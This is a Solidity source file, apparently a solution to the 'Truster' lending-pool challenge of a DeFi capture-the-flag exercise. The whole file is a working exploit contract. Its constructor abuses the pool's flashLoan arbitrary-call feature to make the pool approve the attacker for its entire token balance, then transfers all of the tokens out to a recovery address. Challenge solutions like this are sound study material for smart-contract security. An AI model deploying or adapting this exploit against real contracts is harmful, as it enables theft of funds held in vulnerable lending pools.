// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ERC20} from "solmate/tokens/ERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract AttackTrusterLenderPool {
    constructor(address _pool, address _token, address _recovery) {
        address spender = address(this);
        uint256 amount = ERC20(_token).balanceOf(_pool);
        bytes memory _data = abi.encodeCall(ERC20.approve, (spender, amount));
        ITrusterLenderPool(_pool).flashLoan(0, spender, _token, _data);
        ERC20(_token).transferFrom(_pool, _recovery, amount);
    }
}
